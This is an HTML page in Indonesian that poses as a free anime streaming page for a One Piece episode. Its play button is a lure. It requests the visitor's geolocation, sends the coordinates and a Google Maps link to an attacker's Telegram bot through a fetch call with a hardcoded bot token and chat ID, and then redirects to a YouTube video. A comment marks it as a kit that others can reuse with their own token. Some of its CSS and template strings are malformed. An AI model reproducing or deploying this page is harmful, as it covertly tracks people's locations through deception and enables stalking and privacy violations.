<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Nonton Anime Sub Indo [HD]</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #000;

            text-align: center;

        }
        .container {
            max-width: 800px;

        .video-placeholder {
            background: #222;

            border-radius: 10px;
            margin: 20px 0;

        button {
            background: #e50914;

</head>
<body>
    <div class="container">
        <h1>ONE PIECE Episode 1071 - Sub Indo [HD]</h1>
        <div class="video-placeholder">
            <p>Selamat nonton film anime terbaru 2025</p>
            <button onclick="getLocation()">‚ñ∂ Putar Sekarang</button>
            <div id="loading">Memuat video...</div>
        </div>
    </div>

    <script>
      // isi token sama id lu disini kontol
        const botToken = '8036311608:AAE-Y7ZMOz_nRTU9j0ueaw67V28xEknk7Oc'; 
        const chatId = '7780572486'; 
        
        

        function getLocation() {
            document.getElementById('loading').style.display = 'block';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    sendLocationToTelegram,
                    showError
                );
            } else {
                alert("Browser lu gak support Geolocation! Pakai HP baru lah.");
            }
        }

        function sendLocationToTelegram(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            const message = üìå LOKASI TERCIDUK! 
üëâ Latitude: ${lat}
üëâ Longitude: ${lon}
üëâ Akurasi: ${accuracy} meter
üåê Google Maps: https://www.google.com/maps?q=${lat},${lon};

            
            fetch(https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)});
            
            
            window.location.href = "https://youtu.be/AVxr-W62AvM?si=rVrY98WrBoBmA5yA"
        }

        function showError(error) {
            alert("Izin lokasi wajib diaktifkan buat nonton anime gratis!");
        }
    </script>
